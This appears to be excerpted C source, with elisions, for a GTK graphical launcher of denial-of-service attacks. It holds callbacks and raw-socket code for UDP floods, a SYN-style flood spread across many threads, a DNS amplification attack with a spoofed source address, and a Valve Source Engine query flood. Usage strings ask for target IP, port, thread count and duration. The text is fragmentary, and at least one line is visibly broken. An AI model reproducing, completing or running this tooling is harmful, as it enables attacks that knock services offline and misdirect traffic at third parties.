...
void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
{
    ...
    gtk_text_buffer_set_text(text_buffer, "usage: sudo ./ddos.py -u <ip> <port> <time>", -1);
    ...
    gtk_entry_set_text(GTK_ENTRY(script_command_entry), "sudo ./ddos.py -u 127.0.0.1 22 30");
...
void cb_udp_ddos_script_2(GtkButton *button, gpointer user_data)
{
    ...
    gtk_entry_set_text(GTK_ENTRY(script_command_entry), "sudo ./udp_basic.py -u 127.0.0.1 22 30");
...
void cb_udp_power_ddos(void)
{
    ...
    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Usage: <target IP/hostname> <target port> <throttle (0)> <packet size:128+8=136> <num threads:150> <time:120>", -1);
...
{
    tcph->source = htons(4444); /** PORT SRC ICI **/
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->res2 = 0;
    tcph->doff = 5;
...
void cb_essyn_attack(void)
{
    ...
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(pps_dialog)->vbox), get_arg_entry_6, TRUE, FALSE, 0);
    ...
    gtk_widget_show_all(GTK_DIALOG(pps_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(pps_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            pps_number = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_6));
            gtk_widget_hide(pps_dialog);
            break;
    ...
    for(i = 0; i < num_threads; i++)
    {
        pthread_create(&thread[i], NULL, &flood, (void*)IP);  /** ICI **/
    }
...
void cb_dns_amped_ddos(void)
{
    ...
    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Usage: <target IP/hostname> <port> <dns_target.txt> <num threads> <time>", -1);
...
void *flood_dns(void *par1)
{
    ...
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.27");   /**     A CHECKER  ***/
    ...
    while(1)
    {
        struct list *list_node = list_node->next;
...
void cb_valve_engine_ddos(GtkButton *button, gpointer user_data)
{
    ...
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(PORT_dialog)->vbox), get_arg_entry_5, TRUE, FALSE, 0);
    ...
    {
        case GTK_RESPONSE_APPLY:
            dest_port = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_5));
            gtk_widget_hide(PORT_dialog);
            break;
...
{
    vse_dest_port = atoi(dest_port);

    udph->source = htons(4444);
    udph->dest = htons(vse_dest_port);
    udph->check = 0;
...
void *flood_vse(void *par1)
{
    ...
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(vse_dest_port); /** ICI **/
    sin.sin_addr.s_addr = inet_addr(td);
